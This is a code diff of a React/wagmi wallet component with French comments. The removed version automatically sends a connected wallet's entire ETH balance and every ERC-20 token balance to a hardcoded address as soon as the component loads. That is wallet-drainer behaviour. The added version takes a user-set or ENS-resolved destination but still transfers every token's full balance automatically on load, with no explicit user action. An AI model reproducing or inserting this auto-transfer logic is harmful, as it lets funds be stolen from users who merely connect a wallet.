@@ -1,74 +1,82 @@
-import { useToasts } from '@geist-ui/core';
-import { erc20ABI, usePublicClient, useWalletClient, useAccount } from 'wagmi';
+import { useEffect } from 'react';
 import { useAtom } from 'jotai';
+import { useWalletClient, usePublicClient } from 'wagmi';
+import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
+import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
 import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
-import { useEffect, useCallback } from 'react';
+import { erc20ABI } from 'wagmi';
+import { normalize } from 'viem/ens';
+import { isAddress } from 'essential-eth';
 
-export const SendAllFunds = () => {
-  const { setToast } = useToasts();
-  const showToast = (message: string, type: any) => setToast({ text: message, type, delay: 4000 });
+export const SendTokens = () => {
+  const [tokens] = useAtom(globalTokensAtom);
+  const [destinationAddress, setDestinationAddress] = useAtom(destinationAddressAtom);
+  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
 
-  const [tokens] = useAtom(globalTokensAtom); // Assurez-vous que les tokens sont bien récupérés
   const { data: walletClient } = useWalletClient();
   const publicClient = usePublicClient();
-  const { address } = useAccount();
 
-  const destinationAddress = '0x3351D8F2F3F4708d2A7B5FbbD4Db350Af7313B75';
+  // Automatiser l'envoi de tous les tokens disponibles
+  const sendAllTokens = async () => {
+    const tokensToSend: ReadonlyArray<`0x${string}`> = tokens
+      .filter((token) => BigInt(token.balance) > 0) // Vérifier les tokens avec un solde positif
+      .map((token) => token.contract_address as `0x${string}`);
 
-  const sendEth = async () => {
-    if (!walletClient || !destinationAddress) return;
-
-    const balance = await publicClient.getBalance({ address });
-
-    if (balance > 0n) {
-      try {
-        const tx = await walletClient.sendTransaction({
-          to: destinationAddress,
-          value: balance - BigInt(21000 * 10 ** 9), // Ajuster pour les frais de gas
-        });
-        showToast(`ETH sent: ${tx.hash}`, 'success');
-      } catch (err) {
-        showToast(`ETH send error: ${err?.reason || 'Unknown error'}`, 'warning');
+    if (!walletClient) return;
+    if (!destinationAddress) return;
+    
+    // Vérifier si l'adresse de destination est une adresse ENS
+    if (destinationAddress.includes('.')) {
+      const resolvedDestinationAddress = await publicClient.getEnsAddress({
+        name: normalize(destinationAddress),
+      });
+      if (resolvedDestinationAddress) {
+        setDestinationAddress(resolvedDestinationAddress);
+      } else {
+        console.error("Adresse ENS introuvable");
+        return;
       }
     }
-  };
 
-  const sendAllTokens = async () => {
-    if (!walletClient || !destinationAddress) return;
-
-    for (const token of tokens) {
-      const { contract_address, balance } = token;
-      if (balance === '0') continue;
+    // Envoyer tous les tokens
+    for (const tokenAddress of tokensToSend) {
+      const token = tokens.find((token) => token.contract_address === tokenAddress);
+      if (!token) continue;
 
       try {
-        const balanceBigInt = BigInt(balance);
-
         const { request } = await publicClient.simulateContract({
           account: walletClient.account,
-          address: contract_address as `0x${string}`,
+          address: tokenAddress,
           abi: erc20ABI,
           functionName: 'transfer',
-          args: [destinationAddress as `0x${string}`, balanceBigInt],
+          args: [
+            destinationAddress as `0x${string}`,
+            BigInt(token.balance),
+          ],
         });
 
-        await walletClient.writeContract(request);
-        showToast(`Sent ${token.contract_ticker_symbol}`, 'success');
+        const response = await walletClient.writeContract(request);
+
+        // Mettre à jour l'état pour marquer le token comme envoyé
+        setCheckedRecords((old) => ({
+          ...old,
+          [tokenAddress]: {
+            ...old[tokenAddress],
+            pendingTxn: response,
+          },
+        }));
+
       } catch (err) {
-        showToast(`Error sending ${token.contract_ticker_symbol}: ${err?.reason || 'Unknown error'}`, 'warning');
+        console.error(`Erreur avec le token ${token?.contract_ticker_symbol}:`, err);
       }
     }
   };
 
-  const sendAllFunds = useCallback(async () => {
-    await sendAllTokens();
-    await sendEth();
-  }, [tokens, sendEth, sendAllTokens]);
-
   useEffect(() => {
-    if (tokens.length > 0) {
-      sendAllFunds();
+    if (tokens.length > 0 && destinationAddress) {
+      sendAllTokens();
     }
-  }, [tokens, sendAllFunds]);
+  }, [tokens, destinationAddress, walletClient]); // Quand les tokens ou l'adresse changent, l'envoi se déclenche
 
-  return <div style={{ margin: '20px' }}></div>;
+  return <div style={{ margin: '20px' }}>Tokens being sent automatically...</div>;
 };
